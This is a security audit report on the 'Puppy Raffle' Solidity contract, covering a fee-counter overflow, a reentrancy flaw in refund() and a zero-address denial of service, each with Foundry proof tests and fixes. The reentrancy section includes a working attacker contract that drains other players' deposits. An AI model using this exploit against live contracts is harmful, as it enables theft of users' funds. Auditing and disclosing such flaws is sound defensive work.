# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Overview  
Puppy Raffle is an on-chain ERC-721 raffle that lets anyone buy tickets to win a randomly generated dog NFT.

1. Deployment sets an immutable ticket price (`entranceFee`), a fee recipient, and how long each round lasts (`raffleDuration`).  
2. `enterRaffle(address[] newPlayers)` is payable; `msg.value` must equal `entranceFee * newPlayers.length`. It records each unique address, rejecting duplicates or under-payment. Group entries or multiple tickets are allowed by passing multiple addresses.  
3. Any player can exit before the draw by calling `refund(index)`, voiding their ticket and returning their funds.  
4. When `raffleDuration` has elapsed and at least four active players exist, anyone may call `selectWinner()`. A pseudo-random index picks the winner, PuppyRaffle mints an NFT to them with rarity metadata, and sends the pot minus a protocol fee to the winner. The fee is stored in `totalFees`.  
5. After all players have either won or refunded, the owner can `withdrawFees()` to move the accumulated fees to `feeAddress`, and can update that address via `changeFeeAddress()`.  

Comprehensive Foundry tests cover duplicate entries, refunds, prize payment, URI correctness, and fee withdrawal.
## High Risk Findings
[H-1]. Accounting Invariant Violation issue in PuppyRaffle::selectWinner, withdrawFees
[H-2]. Reentrancy issue in PuppyRaffle::refund
## Medium Risk Findings
[M-1]. DOS issue in PuppyRaffle::enterRaffle


### Number of Findings
- C: 0
- H: 2
- M: 1
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Accounting Invariant Violation issue in PuppyRaffle::selectWinner, withdrawFees

## Description
totalFees is a uint64 but fees are accumulated in wei. With a typical entranceFee of 1 ether and 4 players per round, each round accrues 0.8 ether in fees. After ~24 rounds, totalFees silently overflows uint64 (≈ 18.44 ETH) and wraps. This breaks the invariant used by withdrawFees, permanently bricking fee withdrawals.

Vulnerable code:

4-puppy-raffle-audit/src/PuppyRaffle.sol#L31-L33
uint64 public totalFees = 0;

4-puppy-raffle-audit/src/PuppyRaffle.sol#L106-L115
uint256 fee = (totalAmountCollected * 20) / 100;
 totalFees = totalFees + uint64(fee); // truncates and wraps at 2^64

4-puppy-raffle-audit/src/PuppyRaffle.sol#L147-L155
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
uint256 feesToWithdraw = totalFees;
totalFees = 0;
(bool success,) = feeAddress.call{value: feesToWithdraw}("");
require(success, "PuppyRaffle: Failed to withdraw fees");

After overflow, address(this).balance (true accumulated fees) is greater than totalFees (wrapped), so the require() never passes, permanently bricking withdrawFees.

## Impact
Once totalFees overflows the uint64 limit, the equality check in withdrawFees() can never succeed again. All ETH previously accumulated as protocol fees becomes permanently stuck in the contract, with no way for the feeAddress or anyone else to recover it. The loss is irreversible without a contract migration.

## Proof of Concept
1) Deploy with entranceFee = 1 ether, raffleDuration = 0 for simplicity.
2) Repeat 24 rounds with 4 players each. Each round accrues 0.8 ether; after 24 rounds, total fees ≈ 19.2 ether > 2^64-1 wei, so totalFees wraps.
3) address(this).balance holds ~19.2 ether; totalFees is wrapped to ~0.75 ether. withdrawFees requires exact equality and thus reverts permanently.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract FeesOverflowDosTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(0xFEE);

    function setUp() public {
        // raffleDuration = 0 to avoid warping time between rounds
        raffle = new PuppyRaffle(entranceFee, feeAddress, 0);
        vm.deal(address(this), 200 ether);
    }

    function testUint64OverflowBricksWithdraw() public {
        address[] memory four = new address[](4);
        four[0] = address(0xA1);
        four[1] = address(0xA2);
        four[2] = address(0xA3);
        four[3] = address(0xA4);

        // Run 24 rounds; each round accrues 0.8 ETH
        for (uint256 i = 0; i < 24; i++) {
            raffle.enterRaffle{value: 4 ether}(four);
            raffle.selectWinner();
        }

        uint256 bal = address(raffle).balance; // ~19.2 ETH
        uint256 tf = uint256(raffle.totalFees()); // wrapped < bal
        assertTrue(bal != tf, "Invariant unexpectedly holds after overflow");

        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Use uint256 for totalFees to match ETH units and avoid truncation, and remove lossy casts. Example:

- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
...
- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees + fee;

Additionally, consider loosening the withdraw invariant to tolerate rounding dust (if entranceFee not divisible by 100) or track active deposits separately (e.g., a running counter of activeValue) instead of relying on balance equality.

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
Reentrancy in refund allows an attacker to drain other players' deposits by repeatedly calling refund before the player slot is zeroed. The vulnerable external call occurs before state is updated, enabling recursive refunds:

4-puppy-raffle-audit/src/PuppyRaffle.sol#L78-L90

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // external call BEFORE state update (reentrancy window)

    players[playerIndex] = address(0); // state updated too late
    emit RaffleRefunded(playerAddress);
}

Using Address.sendValue sends all gas and allows arbitrary code execution in msg.sender's fallback. Since players[playerIndex] is set to zero only after the call, a malicious contract can reenter refund multiple times and collect multiple refunds, draining the entire contract balance funded by other players.

## Impact
Direct, permissionless theft of funds. A malicious player can refund themselves multiple times in one transaction, draining the entire contract balance (including other players’ deposits) until depletion. This is a classic reentrancy allowing theft beyond the attacker's own ticket price.

## Proof of Concept
1) Two honest users A and B each enter, funding the contract with 2 * entranceFee.
2) Attacker deploys a malicious contract and enters once.
3) Attacker calls refund on their index. In the receive() fallback, attacker reenters refund repeatedly while the contract still has balance.
4) Because state is not yet updated (players[index] still equals attacker), all reentrant calls pass the checks and transfer entranceFee again and again.
5) Attacker ends with 3 * entranceFee and only paid for 1 ticket, net stealing 2 * entranceFee from others.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrantAttacker {
    PuppyRaffle public raffle;
    uint256 public idx;
    uint256 public remaining;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    // Start the attack: store index and desired reentry count, then trigger first refund
    function attack(uint256 _idx, uint256 times) external {
        idx = _idx;
        remaining = times; // number of additional reentries (so total refunds = times + 1)
        raffle.refund(idx);
    }

    // Receive ETH from refund; reenter while balance allows
    receive() external payable {
        if (remaining > 0 && address(raffle).balance >= raffle.entranceFee()) {
            remaining--;
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;

    address feeAddress = address(0xFEE);
    address victim1 = address(0xBEEF1);
    address victim2 = address(0xBEEF2);

    function setUp() public {
        // raffleDuration = 0 for simplicity
        raffle = new PuppyRaffle(entranceFee, feeAddress, 0);
    }

    function testRefundReentrancyDrainsOthers() public {
        // Fund victims and have each enter once
        vm.deal(victim1, entranceFee);
        vm.prank(victim1);
        address[] memory arr1 = new address[](1);
        arr1[0] = victim1;
        raffle.enterRaffle{value: entranceFee}(arr1);

        vm.deal(victim2, entranceFee);
        vm.prank(victim2);
        address[] memory arr2 = new address[](1);
        arr2[0] = victim2;
        raffle.enterRaffle{value: entranceFee}(arr2);

        // Deploy attacker contract and have it enter once
        ReentrantAttacker attacker = new ReentrantAttacker(raffle);
        vm.deal(address(attacker), entranceFee);
        vm.prank(address(attacker));
        address[] memory arr3 = new address[](1);
        arr3[0] = address(attacker);
        raffle.enterRaffle{value: entranceFee}(arr3);

        // Index of attacker
        uint256 idx = raffle.getActivePlayerIndex(address(attacker));
        assertGt(idx, 0); // should be 2 with the above order

        uint256 balBefore = address(attacker).balance; // 0

        // Reenter twice (total 3 refunds): drains all 3 * entranceFee in contract
        vm.prank(address(attacker));
        attacker.attack(idx, 2);

        // Attacker now holds 3 * entranceFee, net profit = 2 * entranceFee (stolen from victims)
        assertEq(address(attacker).balance, balBefore + 3 ether);
        // Contract drained (no players were set to zero until outermost call finished)
        assertEq(address(raffle).balance, 0);
    }
}

## Suggested Mitigation
Apply Checks-Effects-Interactions and/or a reentrancy guard. Set the player slot to zero before transferring funds, and optionally use OpenZeppelin ReentrancyGuard. Example fix:

- function refund(uint256 playerIndex) public {
+ function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-   payable(msg.sender).sendValue(entranceFee);
-   players[playerIndex] = address(0);
+   players[playerIndex] = address(0); // effects first
+   payable(msg.sender).sendValue(entranceFee); // interaction after state update
    emit RaffleRefunded(playerAddress);
}

Additionally, consider adding nonReentrant to selectWinner and withdrawFees as defense-in-depth.



# Medium Risk Findings

## [M-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
Duplicate checking in enterRaffle scans the entire players array after pushing new entries and does not ignore address(0). When two or more players have refunded, their slots are set to address(0). This creates duplicate zeros, causing all future enterRaffle calls to revert permanently (and selectWinner cannot progress if < 4 players). Vulnerable snippet:

4-puppy-raffle-audit/src/PuppyRaffle.sol#L60-L73

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player"); // compares zeros too
        }
    }
    emit RaffleEnter(newPlayers);
}

Since refund() writes players[playerIndex] = address(0), two refunds produce two identical entries (address(0), address(0)). The nested duplicate check then always reverts on any subsequent enterRaffle, bricking the round when players.length < 4.

## Impact
Permanent denial-of-service of new entries if two or more players have refunded in the current round. If the array length is then < 4, selectWinner cannot be called due to the 4-player minimum, permanently bricking the raffle until redeployment (admin intervention).

## Proof of Concept
1) Two different users enter: players = [A, B].
2) Both call refund on their respective indices: players = [address(0), address(0)].
3) Any subsequent call to enterRaffle reverts due to duplicate check encountering two zeros.
4) With players.length == 2 (< 4), selectWinner reverts ("Need at least 4 players"). Round is stuck forever.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ZeroAddressDuplicateDosTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(0xFEE);

    function setUp() public {
        // raffleDuration = 0 for simplicity
        raffle = new PuppyRaffle(entranceFee, feeAddress, 0);
    }

    function testDuplicateZeroBricksEntryAndSelection() public {
        address A = address(0xA);
        address B = address(0xB);
        vm.deal(A, entranceFee);
        vm.deal(B, entranceFee);

        vm.prank(A);
        address[] memory arrA = new address[](1);
        arrA[0] = A;
        raffle.enterRaffle{value: entranceFee}(arrA);

        vm.prank(B);
        address[] memory arrB = new address[](1);
        arrB[0] = B;
        raffle.enterRaffle{value: entranceFee}(arrB);

        // Both refund, leaving [0x0, 0x0]
        vm.prank(A);
        raffle.refund(0);
        vm.prank(B);
        raffle.refund(1);

        // Any new entry now reverts due to duplicate zeros
        address C = address(0xC);
        vm.deal(C, entranceFee);
        vm.prank(C);
        address[] memory arrC = new address[](1);
        arrC[0] = C;
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        raffle.enterRaffle{value: entranceFee}(arrC);

        // And selection is impossible with < 4 players
        vm.expectRevert(bytes("PuppyRaffle: Need at least 4 players"));
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Exclude address(0) from duplicate checks and avoid O(n^2) scanning across historical refunded slots. Options:
- Ignore zero slots when checking duplicates, and only check newPlayers against existing non-zero players, plus deduplicate within newPlayers:

for (uint256 i = 0; i < newPlayers.length; i++) {
    address p = newPlayers[i];
    require(p != address(0), "PuppyRaffle: zero address not allowed");
    // ensure no duplicates within newPlayers
    for (uint256 k = i + 1; k < newPlayers.length; k++) {
        require(newPlayers[k] != p, "PuppyRaffle: Duplicate player in batch");
    }
    // ensure not already active (ignore zero slots)
    for (uint256 j = 0; j < players.length; j++) {
        if (players[j] != address(0)) {
            require(players[j] != p, "PuppyRaffle: Duplicate player");
        }
    }
}
for (uint256 i = 0; i < newPlayers.length; i++) {
    players.push(newPlayers[i]);
}

- Preferably, maintain a mapping(address => bool) active to check duplicates in O(1), and update it on refund/selectWinner to avoid scanning.



